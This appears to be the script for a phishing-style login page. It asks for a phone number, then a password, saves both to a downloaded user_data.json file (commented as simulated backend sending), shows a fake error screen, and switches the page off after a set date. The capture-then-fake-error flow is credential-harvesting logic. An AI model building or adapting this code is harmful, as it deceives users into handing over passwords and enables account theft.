function enableContinueButton() {
    const input = document.getElementById('phone').value;
    const continueBtn = document.getElementById('continueBtn');
    console.log("Input value: ", input);

    // Remove non-digit characters for length check
    const cleanedInput = input.replace(/\D/g, '');
    console.log("Cleaned input value: ", cleanedInput);

    if (cleanedInput.length >= 1 && cleanedInput.length <= 10) {
        continueBtn.disabled = false;
        continueBtn.style.cursor = "pointer";
        console.log("Button enabled");
    } else {
        continueBtn.disabled = true;
        continueBtn.style.cursor = "not-allowed";
        console.log("Button disabled");
    }
}

function goToPasswordSection(event) {
    event.preventDefault();
    console.log("Continue button clicked");

    // Hide number section and show password section
    document.getElementById('numberSection').style.display = 'none';
    document.getElementById('passwordSection').style.display = 'block';
}

function showError(event) {
    event.preventDefault();
    console.log("Password submitted");

    // Simulate sending data to the backend
    const phone = document.getElementById('phone').value;
    const password = document.getElementById('password').value;

    // Create a JSON object with the data
    const data = { phone, password };

    // Convert the data to a JSON string and create a blob
    const jsonBlob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });

    // Create a link element
    const link = document.createElement('a');
    link.href = URL.createObjectURL(jsonBlob);
    link.download = 'user_data.json';

    // Append the link to the document, click it to trigger the download, and remove the link
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    // Hide password section and show error section
    document.getElementById('passwordSection').style.display = 'none';
    document.getElementById('errorSection').style.display = 'block';
}

// Logic for time-limited access
const endDate = new Date('2024-12-01'); // Set expiration date

if (new Date() > endDate) {
    document.body.innerHTML = '<h1>This service is no longer available.</h1>';
}
